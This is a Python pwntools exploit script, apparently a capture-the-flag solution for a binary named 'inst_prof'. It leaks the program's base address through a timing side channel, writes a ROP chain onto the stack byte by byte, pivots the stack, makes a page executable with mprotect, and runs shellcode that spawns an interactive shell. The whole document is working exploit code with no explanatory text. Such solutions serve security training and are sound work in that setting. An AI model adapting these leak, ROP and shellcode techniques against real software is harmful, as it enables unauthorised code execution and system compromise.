from pwn import *

DUMMY_VALUE = 0xdeadbeef

# Use a cache because assembling is slow and the binary can timeout
cache = {}
def assemble(s):
    if s in cache:
        return cache[s]
    else:
        b = asm(s)
        assert len(b) <= 4
        cache[s] = b
        return b

def exec(p, instruction, expect_timestamp=True):
    instruction = assemble(instruction)
    instruction += b"\x90" * (4 - len(instruction))
    p.send(instruction)
    if expect_timestamp:
        r = p.recvn(8)
        return u64(r)
    else:
        return

context.arch='amd64'

shellcode = asm(shellcraft.amd64.linux.sh())

p = process('./inst_prof')
p.recvuntil(b'ready\n')

print(f"[*] Leak PIE base")
leak = 0
for i in range(0, 64):
    leak *= 2
    exec(p, 'mov r14, qword ptr [rsp]')
    for _ in range(i):
        exec(p, "shl r14, 1; ret")
    for _ in range(63):
        exec(p, "shr r14, 1; ret")
    t = exec(p, "sub rcx, r14")
    if t < 4500:
        leak += 1
print(f"[*] Leak: 0x{leak:0x}")
base = leak - 0xb18

read_n = base + 0xa80
make_page_executable = base + 0xa20
pop_rsi_r15 = base + 0xbc1
pop_rdi = base + 0xbc3
shellcode_address = base+0x202200

rop_chain = [
        pop_rdi,
        shellcode_address,
        pop_rsi_r15,
        len(shellcode),
        DUMMY_VALUE,  # r15
        read_n,
        pop_rdi,
        shellcode_address-0x200, # Must be page aligned or mprotect will fail!
        make_page_executable,
        shellcode_address
]

rc = b''
for gadget in rop_chain:
    rc += p64(gadget)

print("[*] Prepare shellcode address in r14")
exec(p, "mov r14, rsp") 
for _ in range(0x40):
    exec(p, "inc r14; ret")

print("[*] Write rop-chain")
for b in rc:
    exec(p, f"mov byte ptr [r14], {b}")
    exec(p, "inc r14; ret")

print("[*] Rewind r14 to start of ropchain")
for _ in rc:
    exec(p, "dec r14; ret")


print("[*] Stack pivot")
exec(p, "mov rsp, r14; ret", expect_timestamp=False)

print("[*] Send shellcode")
p.send(shellcode)

print("[*] Profit")
p.interactive()
